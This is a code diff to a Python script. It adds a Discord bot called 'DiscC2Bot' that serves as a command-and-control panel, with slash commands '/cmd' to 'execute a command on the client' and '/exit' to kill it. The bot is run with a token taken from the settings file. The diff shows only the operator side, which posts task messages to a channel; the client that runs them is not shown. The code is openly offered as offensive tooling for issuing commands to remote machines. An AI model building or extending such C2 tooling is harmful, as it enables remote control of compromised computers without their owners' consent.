@@ -2,6 +2,8 @@ import os
 import json
 import time
 import requests
+import discord
+from discord import app_commands
 
 CONFIG_FILE = "settings.json"
 
@@ -54,9 +56,34 @@ def load_or_create_config():
     print("[!] Settings saved to settings.json\n")
     return config
 
+class DiscC2Bot(discord.Client):
+    def __init__(self):
+        super().__init__(intents=discord.Intents.default())
+        self.tree = app_commands.CommandTree(self)
+
+    async def setup_hook(self):
+        await self.tree.sync()
+
+bot = DiscC2Bot()
+
+@bot.tree.command(name="cmd", description="Execute a command on the client")
+@app_commands.describe(command="The command to execute")
+async def cmd(interaction: discord.Interaction, command: str):
+    await interaction.response.send_message(f"[Task] {command}")
+
+@bot.tree.command(name="exit", description="Kill the client")
+async def exit_client(interaction: discord.Interaction):
+    await interaction.response.send_message("[Task] exit")
+
+@bot.event
+async def on_ready():
+    print(f"[*] Logged in as {bot.user}")
+    print("[*] Bot is ready. Use /cmd and /exit in your Discord server.")
+
 def main():
     print_banner()
     config = load_or_create_config()
+    bot.run(config["bot_token"])
 
 if __name__ == "__main__":
     main()
